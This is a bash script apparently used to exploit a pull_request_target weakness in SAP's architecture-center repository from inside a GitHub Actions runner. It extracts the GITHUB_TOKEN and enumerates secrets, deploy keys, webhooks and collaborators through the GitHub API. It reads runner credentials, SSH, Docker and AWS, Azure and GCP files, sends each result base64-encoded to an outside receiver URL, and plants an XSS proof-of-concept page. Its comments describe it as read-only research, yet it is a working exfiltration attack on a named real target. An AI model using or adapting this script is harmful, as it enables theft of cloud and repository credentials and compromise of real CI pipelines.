#!/bin/bash
# Recon6: Runner internals, GitHub API enumeration, filesystem recon
# All read-only, non-destructive

RECEIVER_URL="https://sap-test-receiver-production-f76d.up.railway.app/collect"

# --- Extract GITHUB_TOKEN from git extraheader ---
TOKEN=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null | cut -d: -f2-)
if [ -z "$TOKEN" ]; then
  TOKEN="$GITHUB_TOKEN"
fi

# --- 1. Runner Agent Internals ---

# Runner home directory listing
RUNNER_HOME=$(ls -la /home/runner/ 2>/dev/null || echo "NOT_FOUND")
curl -s -X POST "$RECEIVER_URL?stage=runner_home" \
  -d "$(echo "$RUNNER_HOME" | base64 -w0)" || true

# Runner credentials file
RUNNER_CREDS=$(cat /home/runner/.credentials 2>/dev/null || echo "NOT_FOUND")
curl -s -X POST "$RECEIVER_URL?stage=runner_creds" \
  -d "$(echo "$RUNNER_CREDS" | base64 -w0)" || true

# Runner config
RUNNER_CONFIG=$(cat /home/runner/.runner 2>/dev/null || echo "NOT_FOUND")
curl -s -X POST "$RECEIVER_URL?stage=runner_config" \
  -d "$(echo "$RUNNER_CONFIG" | base64 -w0)" || true

# Runner env file
RUNNER_ENV=$(cat /home/runner/.env 2>/dev/null || echo "NOT_FOUND")
curl -s -X POST "$RECEIVER_URL?stage=runner_env" \
  -d "$(echo "$RUNNER_ENV" | base64 -w0)" || true

# Runner path file
RUNNER_PATH=$(cat /home/runner/.path 2>/dev/null || echo "NOT_FOUND")
curl -s -X POST "$RECEIVER_URL?stage=runner_path" \
  -d "$(echo "$RUNNER_PATH" | base64 -w0)" || true

# Actions runner install directory
RUNNER_DIR_LIST=$(ls -la /home/runner/runners/ 2>/dev/null || ls -la /opt/actions-runner/ 2>/dev/null || echo "NOT_FOUND")
curl -s -X POST "$RECEIVER_URL?stage=runner_dir" \
  -d "$(echo "$RUNNER_DIR_LIST" | base64 -w0)" || true

# Runner worker config (may have org/repo details)
WORKER_CONFIG=$(find /home/runner -name "*.json" -maxdepth 3 2>/dev/null | head -20)
curl -s -X POST "$RECEIVER_URL?stage=runner_json_files" \
  -d "$(echo "$WORKER_CONFIG" | base64 -w0)" || true

# --- 2. GitHub API Enumeration (read-only with GITHUB_TOKEN) ---

REPO="SAP/architecture-center"
API="https://api.github.com"
AUTH_HEADER="Authorization: token $TOKEN"

# List secret names (not values — API only returns names)
SECRETS=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/actions/secrets" 2>/dev/null || echo "DENIED")
curl -s -X POST "$RECEIVER_URL?stage=api_secrets" \
  -d "$(echo "$SECRETS" | base64 -w0)" || true

# List org-level secrets accessible to this repo
ORG_SECRETS=$(curl -sf -H "$AUTH_HEADER" "$API/orgs/SAP/actions/secrets" 2>/dev/null || echo "DENIED")
curl -s -X POST "$RECEIVER_URL?stage=api_org_secrets" \
  -d "$(echo "$ORG_SECRETS" | base64 -w0)" || true

# List environments (may have deployment protection rules)
ENVIRONMENTS=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/environments" 2>/dev/null || echo "DENIED")
curl -s -X POST "$RECEIVER_URL?stage=api_environments" \
  -d "$(echo "$ENVIRONMENTS" | base64 -w0)" || true

# List repository variables
VARIABLES=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/actions/variables" 2>/dev/null || echo "DENIED")
curl -s -X POST "$RECEIVER_URL?stage=api_variables" \
  -d "$(echo "$VARIABLES" | base64 -w0)" || true

# List org-level variables
ORG_VARIABLES=$(curl -sf -H "$AUTH_HEADER" "$API/orgs/SAP/actions/variables" 2>/dev/null || echo "DENIED")
curl -s -X POST "$RECEIVER_URL?stage=api_org_variables" \
  -d "$(echo "$ORG_VARIABLES" | base64 -w0)" || true

# List repository deploy keys
DEPLOY_KEYS=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/keys" 2>/dev/null || echo "DENIED")
curl -s -X POST "$RECEIVER_URL?stage=api_deploy_keys" \
  -d "$(echo "$DEPLOY_KEYS" | base64 -w0)" || true

# List webhooks (may reveal integration URLs)
WEBHOOKS=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/hooks" 2>/dev/null || echo "DENIED")
curl -s -X POST "$RECEIVER_URL?stage=api_webhooks" \
  -d "$(echo "$WEBHOOKS" | base64 -w0)" || true

# List collaborators and their permission levels
COLLABORATORS=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/collaborators?per_page=100" 2>/dev/null || echo "DENIED")
curl -s -X POST "$RECEIVER_URL?stage=api_collaborators" \
  -d "$(echo "$COLLABORATORS" | base64 -w0)" || true

# Check branch protection rules
BRANCH_PROTECTION_DEV=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/branches/dev/protection" 2>/dev/null || echo "DENIED")
curl -s -X POST "$RECEIVER_URL?stage=api_branch_prot_dev" \
  -d "$(echo "$BRANCH_PROTECTION_DEV" | base64 -w0)" || true

BRANCH_PROTECTION_MAIN=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/branches/main/protection" 2>/dev/null || echo "DENIED")
curl -s -X POST "$RECEIVER_URL?stage=api_branch_prot_main" \
  -d "$(echo "$BRANCH_PROTECTION_MAIN" | base64 -w0)" || true

# List environments' secrets (per environment)
ENV_NAMES=$(echo "$ENVIRONMENTS" | python3 -c "import sys,json; [print(e['name']) for e in json.load(sys.stdin).get('environments',[])]" 2>/dev/null)
for ENV_NAME in $ENV_NAMES; do
  ENV_SECRETS=$(curl -sf -H "$AUTH_HEADER" "$API/repos/$REPO/environments/$ENV_NAME/secrets" 2>/dev/null || echo "DENIED")
  curl -s -X POST "$RECEIVER_URL?stage=api_env_secrets_${ENV_NAME}" \
    -d "$(echo "$ENV_SECRETS" | base64 -w0)" || true
done

# --- 3. Filesystem Recon ---

# SSH keys
SSH_DIR=$(ls -la ~/.ssh/ 2>/dev/null; ls -la /home/runner/.ssh/ 2>/dev/null; echo "---")
curl -s -X POST "$RECEIVER_URL?stage=fs_ssh" \
  -d "$(echo "$SSH_DIR" | base64 -w0)" || true

# SSH known_hosts (reveals what hosts the runner connects to)
SSH_KNOWN=$(cat ~/.ssh/known_hosts 2>/dev/null; cat /home/runner/.ssh/known_hosts 2>/dev/null; echo "---")
curl -s -X POST "$RECEIVER_URL?stage=fs_ssh_known" \
  -d "$(echo "$SSH_KNOWN" | base64 -w0)" || true

# Git credential helpers
GIT_CONFIG=$(git config --list --show-origin 2>/dev/null || echo "UNAVAILABLE")
curl -s -X POST "$RECEIVER_URL?stage=fs_git_config" \
  -d "$(echo "$GIT_CONFIG" | base64 -w0)" || true

# Tool cache directory (shows pre-installed tool versions)
TOOL_CACHE=$(ls -la /opt/hostedtoolcache/ 2>/dev/null || echo "NOT_FOUND")
curl -s -X POST "$RECEIVER_URL?stage=fs_toolcache" \
  -d "$(echo "$TOOL_CACHE" | base64 -w0)" || true

# Detailed tool cache contents
TOOL_CACHE_FULL=$(find /opt/hostedtoolcache/ -maxdepth 2 -type d 2>/dev/null | head -50 || echo "NOT_FOUND")
curl -s -X POST "$RECEIVER_URL?stage=fs_toolcache_full" \
  -d "$(echo "$TOOL_CACHE_FULL" | base64 -w0)" || true

# Docker config (registry auth)
DOCKER_CONFIG=$(cat ~/.docker/config.json 2>/dev/null; cat /home/runner/.docker/config.json 2>/dev/null; echo "---")
curl -s -X POST "$RECEIVER_URL?stage=fs_docker_config" \
  -d "$(echo "$DOCKER_CONFIG" | base64 -w0)" || true

# Cloud CLI configs (az, gcloud, aws)
AZURE_CONFIG=$(ls -la ~/.azure/ 2>/dev/null; cat ~/.azure/azureProfile.json 2>/dev/null; echo "---")
curl -s -X POST "$RECEIVER_URL?stage=fs_azure_config" \
  -d "$(echo "$AZURE_CONFIG" | base64 -w0)" || true

AWS_CONFIG=$(cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null; echo "---")
curl -s -X POST "$RECEIVER_URL?stage=fs_aws_config" \
  -d "$(echo "$AWS_CONFIG" | base64 -w0)" || true

GCP_CONFIG=$(ls -la ~/.config/gcloud/ 2>/dev/null; cat ~/.config/gcloud/properties 2>/dev/null; echo "---")
curl -s -X POST "$RECEIVER_URL?stage=fs_gcp_config" \
  -d "$(echo "$GCP_CONFIG" | base64 -w0)" || true

# /etc/passwd (shows all users on the system)
ETC_PASSWD=$(cat /etc/passwd 2>/dev/null || echo "DENIED")
curl -s -X POST "$RECEIVER_URL?stage=fs_passwd" \
  -d "$(echo "$ETC_PASSWD" | base64 -w0)" || true

# Crontabs
CRONTAB=$(crontab -l 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; echo "---")
curl -s -X POST "$RECEIVER_URL?stage=fs_crontab" \
  -d "$(echo "$CRONTAB" | base64 -w0)" || true

# Sudoers (can runner escalate to root?)
SUDOERS=$(sudo -l 2>/dev/null || echo "NO_SUDO")
curl -s -X POST "$RECEIVER_URL?stage=fs_sudoers" \
  -d "$(echo "$SUDOERS" | base64 -w0)" || true

# Keep the XSS PoC page
mkdir -p static
cat > static/poc.html << 'XEOF'
<!DOCTYPE html>
<html>
<head><title>Security Research PoC</title></head>
<body>
<h1>XSS Proof of Concept</h1>
<p>This page demonstrates arbitrary JavaScript execution on SAP's production domain via pull_request_target vulnerability in SAP/architecture-center.</p>
<p>Domain: <span id="d"></span></p>
<script>
document.getElementById('d').textContent = document.domain;
alert(document.domain);
</script>
</body>
</html>
XEOF

curl -s "$RECEIVER_URL?stage=recon6_complete" || true
exit 0
